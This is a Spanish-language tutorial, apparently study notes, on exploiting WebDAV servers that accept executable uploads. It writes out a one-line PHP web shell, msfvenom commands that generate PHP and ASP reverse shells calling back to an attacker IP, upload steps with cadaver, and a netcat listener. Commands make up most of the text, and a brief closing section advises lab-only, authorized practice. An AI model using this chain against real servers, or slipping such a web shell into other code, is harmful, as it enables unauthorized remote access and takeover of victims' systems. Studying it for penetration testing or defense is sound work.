
---
## Cómo crear una Reverse Shell en PHP y ASP

Cuando descubrimos que un servidor WebDAV permite la carga de archivos con extensiones ejecutables, como `.php` o `.asp`, podemos aprovechar esta configuración para subir una _reverse shell_ y obtener acceso remoto al sistema.

Una _reverse shell_ es un archivo que, al ser ejecutado en el servidor, abre una conexión desde el servidor hacia nuestro equipo atacante. Esto nos permite interactuar con el sistema de la víctima desde nuestra máquina.

---

### Reverse Shell en PHP

#### 1. Crear el archivo de shell

Podemos crear un archivo llamado `shell.php` con este contenido mínimo para fines de pruebas:

```php
<?php system($_GET['cmd']); ?>
```

Este archivo nos permite ejecutar comandos pasando el parámetro `cmd` en la URL:

```
http://IP_DEL_SERVIDOR/shell.php?cmd=whoami
```

#### 2. Crear una reverse shell real

Una alternativa más potente sería usar una reverse shell interactiva generada con `msfvenom`:

```bash
msfvenom -p php/reverse_php LHOST=TU_IP LPORT=4444 -f raw > shell.php
```

> Sustituimos `TU_IP` por la dirección IP de nuestro equipo atacante.

#### 3. Subir la shell al servidor

Utilizamos `cadaver` o `curl` para subir el archivo al servidor WebDAV:

```bash
cadaver http://IP_DEL_SERVIDOR/
dav:/> put shell.php
```

#### 4. Escuchar la conexión en nuestra máquina

Ponemos un listener con `netcat`:

```bash
nc -lvnp 4444
```

#### 5. Ejecutar el archivo en el navegador

Cuando accedemos desde el navegador a:

```
http://IP_DEL_SERVIDOR/shell.php
```

La reverse shell se ejecuta y obtenemos conexión en `netcat`.

---

### Reverse Shell en ASP (para servidores Windows)

Si el servidor permite `.asp`, procedemos de forma similar.

#### 1. Crear la shell con `msfvenom`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f asp > shell.asp
```

Este payload creará un archivo `shell.asp` con código que ejecuta una reverse shell en Windows.

#### 2. Subir la shell al servidor WebDAV

```bash
cadaver http://IP_DEL_SERVIDOR/
dav:/> put shell.asp
```

#### 3. Escuchar la conexión

```bash
nc -lvnp 4444
```

#### 4. Ejecutar el archivo

Desde el navegador, accedemos a:

```
http://IP_DEL_SERVIDOR/shell.asp
```

Si todo ha salido bien, se abrirá una shell de Windows en nuestro netcat.

---

## Buenas prácticas al practicar

Cuando experimentamos con shells reversas:

- **Nunca** las probamos fuera de entornos de laboratorio o sin autorización.
    
- Podemos usar máquinas virtuales con Windows/Linux vulnerables, como Metasploitable, Windows XP SP2 o Docker.
    
- Podemos usar una red interna o incluso máquinas virtuales conectadas por host-only.
    
- Siempre capturamos el tráfico con Wireshark o tcpdump para entender qué ocurre.
    

---
